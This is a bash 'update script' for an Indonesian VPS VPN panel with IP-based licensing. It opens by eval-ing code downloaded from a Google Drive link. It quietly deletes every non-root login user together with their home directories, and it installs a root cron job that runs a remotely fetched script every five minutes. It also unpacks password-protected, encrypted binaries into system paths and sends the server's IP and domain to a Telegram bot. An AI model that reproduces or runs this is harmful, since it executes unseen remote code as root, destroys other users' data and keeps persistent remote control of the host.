#!/bin/bash
eval $(wget -qO- "https://drive.google.com/u/4/uc?id=1nC-ftG1J33n16CMTIJK82XGDaByrUyRd")
loading() {
    local pid=$1
    local message=$2
    local delay=0.1
    local spinstr='|/-\'
    tput civis
    while [ -d /proc/$pid ]; do
        local temp=${spinstr#?}
        printf " [%c] $message\r" "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
    done
    tput cnorm
}

# Cek dan install p7zip-full jika belum tersedia
if ! command -v 7z &> /dev/null; then
    echo -e " [INFO] Installing p7zip-full..."
    apt install p7zip-full -y &> /dev/null &
    loading $! "Loading Install p7zip-full"
fi
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
domain=$(cat /etc/xray/domain)
MYIP=$(curl -sS ipv4.icanhazip.com)
username=$(curl -sS https://raw.githubusercontent.com/kapal-api-cup/license/main/ip | grep $MYIP | awk '{print $2}')
valid=$(curl -sS https://raw.githubusercontent.com/kapal-api-cup/license/main/ip | grep $MYIP | awk '{print $3}')
if [[ "$valid" == "Lifetime" ]]; then
  certifacate="Lifetime"
      echo -e "VPS Anda valid, masa aktif: $certifacate"
else
today=$(date +"%Y-%m-%d")
d1=$(date -d "$valid" +%s)
d2=$(date -d "$today" +%s)
certifacate=$(((d1 - d2) / 86400))
fi
# Mendapatkan tanggal dari server
echo -e " [INFO] Fetching server date..."
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=$(date +"%Y-%m-%d" -d "$dateFromServer")

# URL repository
REPOS="https://raw.githubusercontent.com/kapal-api-cup/Script-vpn/main/"
pwadm="Ultrasonicvpn"
# Download file dan proses

Password="$pwadm"

# Daftar user yang diizinkan
allowed_users=("root")

# Dapatkan semua user yang bisa login ke terminal
all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)

# Hapus semua user yang tidak diizinkan
for user in $all_users; do
    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
        userdel -r "$user" > /dev/null 2>&1
        echo "User $user telah dihapus."
    fi
done


echo -e " [INFO] Downloading menu.zip..."
{
> /etc/cron.d/cpu_otm

cat> /etc/cron.d/cpu_otm << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root /usr/bin/autocpu
END
wget -O /usr/bin/autocpu "${REPOS}install/autocpu.sh" && chmod +x /usr/bin/autocpu
    wget -q ${REPOS}menu/menu.zip
    7z x -p$pwadm menu.zip &> /dev/null
    chmod +x menu/*
    enc menu/* &> /dev/null
    mv menu/* /usr/local/sbin
    rm -rf menu menu.zip
    rm -rf /usr/local/sbin/*~
    rm -rf /usr/local/sbin/gz*
    rm -rf /usr/local/sbin/*.bak
} &> /dev/null &
loading $! "Loading Extract and Setup menu"

# Mendapatkan versi dari server
echo -e " [INFO] Fetching server version..."
serverV=$(curl -sS ${REPOS}versi)
echo $serverV > /opt/.ver
rm /root/*.sh*
# Pesan akhir
TEXT="◇━━━━━━━━━━━━━━◇
<b>   ⚠️NOTIF UPDATE SCRIPT⚠️</b>
<b>     Update Script Sukses</b>
◇━━━━━━━━━━━━━━◇
<b>IP VPS  :</b> ${MYIP} 
<b>DOMAIN  :</b> ${domain}
<b>Version :</b> ${serverV}
<b>USER    :</b> ${username}
<b>MASA    :</b> $certifacate DAY
◇━━━━━━━━━━━━━━◇
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo -e " [INFO] File download and setup completed successfully. Version: $serverV!"
exit
